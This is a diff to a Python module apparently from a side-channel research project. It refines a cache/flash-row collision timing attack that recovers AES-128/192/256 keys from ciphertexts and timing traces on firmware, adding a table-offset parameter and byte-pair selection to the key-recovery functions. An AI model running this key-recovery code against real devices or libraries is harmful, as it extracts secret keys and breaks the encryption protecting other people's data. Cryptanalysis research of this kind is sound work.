@@ -23,48 +23,40 @@ from dataclasses import dataclass, field
 from itertools import product
 import numpy as np
 from . import aesref
+from . import lastround
+# Re-exported, not merely imported: `engine` is the name every caller in this
+# repository already has, so the scorer's accumulator, fast path and coverage
+# sets are reachable as `engine.<name>` without a second import line.
+from .lastround import (ROW_PAIRINGS, accumulate, coverage,  # noqa: F401
+                        pairs_all, pairs_intra_column,
+                        score_from_tables, score_surface)
 
 SBOX = aesref.SBOX.astype(np.int64)
 SINV = aesref.SINV.astype(np.int64)
 
 
-_BASE = np.arange(256)
-_NIB_CACHE = {}
+def col_attack_scored(ba, bb, y, tbl, line_shift=4, line_off=0):
+    """Best (ga,gb) minimising mean time on the predicted row-collision set, and
+    a margin (how far below the mean score the winner sits, in std units).
 
-def _nib(tbl, shift=4):
-    """NB[g, x] = tbl[x ^ g] >> shift, i.e. the cache-line tag of the lookup.
-    shift=4 (S-box: 1-byte entries, 16/line -> top nibble); shift=2 (T-table:
-    4-byte entries, 4/line -> top 6 bits). Cached per (table, shift)."""
-    key = (tbl.ctypes.data, shift)
-    NB = _NIB_CACHE.get(key)
-    if NB is None:
-        NB = (tbl[_BASE[None, :] ^ _BASE[:, None]] >> shift).astype(np.intp)  # (256 g, 256 x)
-        _NIB_CACHE[key] = NB
-    return NB
+    `tbl` = SINV (enc direction) or SBOX (dec direction).
 
-def col_attack_scored(ba, bb, y, tbl, line_shift=4):
-    """Best (ga,gb) minimising mean time on the predicted top-nibble-collision
-    set, and a margin (how far below the mean score the winner sits, in std
-    units). `tbl` = SINV (enc direction) or SBOX (dec direction). Vectorised over
-    the inner (gb) guess for speed."""
-    ba = np.asarray(ba, np.int64); bb = np.asarray(bb, np.int64)
-    Ssum = np.zeros((256, 256)); Scnt = np.zeros((256, 256))
-    np.add.at(Ssum, (ba, bb), y); np.add.at(Scnt, (ba, bb), 1.0)
-    NB = _nib(tbl, line_shift)                       # (256, 256)
-    nbins = 1 << (8 - line_shift)                    # 16 for S-box, 64 for T-table
-    scores = np.full((256, 256), np.nan)
-    for ga in range(256):
-        na = NB[ga]                                  # (256,) line-tag per x_a
-        Rs = np.zeros((nbins, 256)); Rc = np.zeros((nbins, 256))
-        np.add.at(Rs, na, Ssum)                      # sum rows into line bins -> Rs[tag, x_b]
-        np.add.at(Rc, na, Scnt)
-        num = Rs[NB, _BASE[None, :]].sum(axis=1)     # for every gb at once -> (256,)
-        den = Rc[NB, _BASE[None, :]].sum(axis=1)
-        with np.errstate(invalid="ignore", divide="ignore"):
-            scores[ga] = np.where(den > 0, num / den, np.nan)
-    flat = scores[np.isfinite(scores)]
-    bi = int(np.nanargmin(scores)); ga, gb = divmod(bi, 256)
-    margin = (flat.mean() - scores[ga, gb]) / (flat.std() + 1e-12)
+    THE SCORING RULE ITSELF LIVES IN `lastround`, not here. It used to live in
+    this function and, separately, in `hardware/atk_lastround.py`, and the two
+    disagreed about whether a shipped library gives up its key: this one scanned
+    all 120 byte pairs but assumed the table starts on a row boundary, that one
+    could express the offset and scored 24 pairs. Both capabilities are now in
+    one scorer and this is a wrapper over it.
+
+    `line_off` is the table's start offset inside the flash row, in table
+    ENTRIES, and it is a per-image property -- `flashleak.row_offset_from_image`
+    reads it, `flashattack.geometry.candidate_row_offsets` lists what to sweep.
+    The default 0 is the textbook case and reproduces every number this
+    function returned before it took the parameter.
+    """
+    scores = score_surface(ba, bb, y, tbl, line_shift=line_shift,
+                           line_off=line_off)
+    ga, gb, margin = lastround.best(scores, margin="z")
     return ga, gb, float(margin)
 
 
@@ -117,8 +109,16 @@ def _roundkey_to_master(rkbytes, direction, keysize):
 
 
 def leaking_offsets(known_blocks, timing, *, direction="enc", line_shift=4,
-                    margin=1.0, ratio=3.0):
+                    line_off=0, margin=1.0, ratio=3.0):
     """Which byte offsets carry the collision channel -- **without the key**.
+
+    NOTE the two senses of "offset", which have already been confused once.
+    This function's return value is a set of byte-pair DISTANCES (which pairs of
+    output bytes can collide). Its `line_off` argument is where the table starts
+    inside the flash row, in table entries -- see `geometry`. They are
+    unrelated, and this one needs that one to be right: at the wrong `line_off`
+    the peaks are computed on a partition the victim does not have, so a real
+    family can fail to stand out.
 
     Only some pairs of output bytes can collide in a cache line; on AES-128 with
     a 16-byte-line S-box it is the offset-3 family. Every other pair contributes
@@ -174,7 +174,8 @@ def leaking_offsets(known_blocks, timing, *, direction="enc", line_shift=4,
         for b in range(a + 1, 16):
             d = min((b - a) % 16, (a - b) % 16)
             by.setdefault(d, []).append(
-                col_attack_scored(known[:, a], known[:, b], y, tbl, line_shift)[2])
+                col_attack_scored(known[:, a], known[:, b], y, tbl, line_shift,
+                                  line_off)[2])
     peaks = {d: float(np.mean(v)) for d, v in by.items()}
     return select_offsets(peaks, margin=margin, ratio=ratio), peaks
 
@@ -207,11 +208,35 @@ def select_offsets(peaks, *, margin=1.0, ratio=3.0):
 
 def recover(known_blocks, timing, *, direction="enc", keysize=128, line_shift=4,
             verify=None, cand_per_pos=4, max_bruteforce=6, truth=None, log=None,
-            pair_offsets=None):
+            pair_offsets=None, line_off=0, pairs="all", ct_adjacent=False,
+            surfaces=None):
     """Recover the key from (known block-cipher output blocks, timing).
 
     known_blocks : (N,16) uint8 -- the AES *output* block the attacker knows.
     timing       : (N,) float   -- per-trace timing (any monotone oracle).
+    line_off     : where the table starts inside the flash row, in table
+                   ENTRIES. A per-image property, not a constant of the attack:
+                   a byte S-box at `0x...cc` is 12, a 4-byte T-table 12 bytes
+                   in is 3. Wrong costs a measured 2.2x in traces; see
+                   `geometry`. Read it with `flashleak.row_offset_from_image`,
+                   or sweep `geometry.candidate_row_offsets()` and keep the
+                   offset that verifies.
+    pairs        : which output-byte pairs to score. "all" (the default) is the
+                   120-pair sweep; "intra-column" is the 24 pairs that are two
+                   reads of one state column, which is what every archived
+                   `hardware/atk_lastround.py` trace count was measured with;
+                   a row-pairing name such as "r1r2" is that pairing's 4; or
+                   pass an explicit list of (ja, jb). A wider vote is not
+                   automatically better -- see `lastround` -- and
+                   `leaking_offsets` is how to choose without the key.
+    ct_adjacent  : only meaningful with a non-"all" `pairs`: the adjacency
+                   convention of the victim's last round. See
+                   `lastround.pairs_intra_column`.
+    surfaces     : optional dict; if given, it is filled with
+                   {(ja, jb): score surface} so a caller can rank candidates or
+                   sum overlapping surfaces without re-scoring. The surfaces
+                   are (256, 256) float64 each -- 120 of them is ~63 MB, so
+                   this is opt-in.
     pair_offsets : restrict the vote to byte pairs this far apart (mod 16).
                    Default None scans all 120 pairs. Passing the offsets that
                    actually leak -- see `leaking_offsets`, which finds them
@@ -228,17 +253,21 @@ def recover(known_blocks, timing, *, direction="enc", keysize=128, line_shift=4,
     tbl = SINV if direction == "enc" else SBOX
 
     votes = np.zeros((16, 256))
-    for a in range(16):
-        for b in range(a + 1, 16):
-            if (pair_offsets is not None
-                    and min((b - a) % 16, (a - b) % 16) not in pair_offsets):
-                continue
-            ga, gb, mg = col_attack_scored(known[:, a], known[:, b], y, tbl, line_shift)
-            if mg > 0:
-                votes[a, ga] += mg
-                votes[b, gb] += mg
+    todo = coverage(pairs, ct_adjacent=ct_adjacent)
+    for a, b in todo:
+        if (pair_offsets is not None
+                and min((b - a) % 16, (a - b) % 16) not in pair_offsets):
+            continue
+        scores = score_surface(known[:, a], known[:, b], y, tbl,
+                               line_shift=line_shift, line_off=line_off)
+        if surfaces is not None:
+            surfaces[(a, b)] = scores
+        ga, gb, mg = lastround.best(scores, margin="z")
+        if mg > 0:
+            votes[a, ga] += mg
+            votes[b, gb] += mg
         if log:
-            log(f"  scanned pairs for byte {a}")
+            log(f"  scored pair ({a},{b}) -> ({ga:3d},{gb:3d}) margin {mg:.3f}")
 
     order = np.argsort(-votes, axis=1)
     roundkey = bytes(int(order[i, 0]) for i in range(16))
@@ -422,13 +451,17 @@ def _roundkey_from_Kprime(Kp):
     srk = np.frombuffer(bytes(Kp), np.uint8)[aesref._SHIFT_ROWS]
     return bytes(aesref._mix(srk[None, :].copy(), inv=False)[0])
 
-def recover_second_round(ct, timing, rk_last, *, keysize, line_shift=4, truth=None, log=None):
+def recover_second_round(ct, timing, rk_last, *, keysize, line_shift=4, truth=None, log=None,
+                         line_off=0):
     """Recover rk[Nr-1] on full firmware, given ct, timing and the recovered
     last round key. `line_shift` matches round Nr-1's table (4 = S-box, 2 = 4-byte
-    T-table)."""
+    T-table), and `line_off` that table's row offset in entries -- which is the
+    round Nr-1 table's, not necessarily the last round's: a build with a
+    separate `te4` has two tables at two addresses."""
     a = peel_last_round(ct, rk_last)
     Xp = _second_round_known(a)
-    res = recover(Xp, timing, direction="enc", keysize=keysize, line_shift=line_shift, log=log)
+    res = recover(Xp, timing, direction="enc", keysize=keysize, line_shift=line_shift,
+                  line_off=line_off, log=log)
     res.roundkey = _roundkey_from_Kprime(res.roundkey)
     res.roundkey_index = {128: 10, 192: 12, 256: 14}[keysize] - 1
     res.which = "second-to-last"
@@ -438,7 +471,8 @@ def recover_second_round(ct, timing, rk_last, *, keysize, line_shift=4, truth=No
 
 
 def recover_full(ct, timing, *, keysize, line_shift_last=4, line_shift_prev=4,
-                 verify=None, key_for_truth=None, log=None):
+                 verify=None, key_for_truth=None, log=None,
+                 line_off_last=0, line_off_prev=0):
     """Full AES-128/192/256 master from ct + timing on unmodified firmware.
     For 128 the last round key suffices; for 192/256 also recovers rk[Nr-1] via
     the MixColumns-linearity reduction and inverts the schedule. `verify=(pt,ct)`
@@ -446,12 +480,13 @@ def recover_full(ct, timing, *, keysize, line_shift_last=4, line_shift_prev=4,
     Nr = {128: 10, 192: 12, 256: 14}[keysize]
     tl = bytes(aesref.key_expansion(key_for_truth)[Nr]) if key_for_truth else None
     last = recover(ct, timing, direction="enc", keysize=keysize, line_shift=line_shift_last,
-                   truth=tl, log=log)
+                   line_off=line_off_last, truth=tl, log=log)
     results = [last]
     if keysize != 128:
         tp = bytes(aesref.key_expansion(key_for_truth)[Nr - 1]) if key_for_truth else None
         prev = recover_second_round(ct, timing, last.roundkey, keysize=keysize,
-                                    line_shift=line_shift_prev, truth=tp, log=log)
+                                    line_shift=line_shift_prev, line_off=line_off_prev,
+                                    truth=tp, log=log)
         results.append(prev)
     try:
         master = master_from_results(results, keysize)
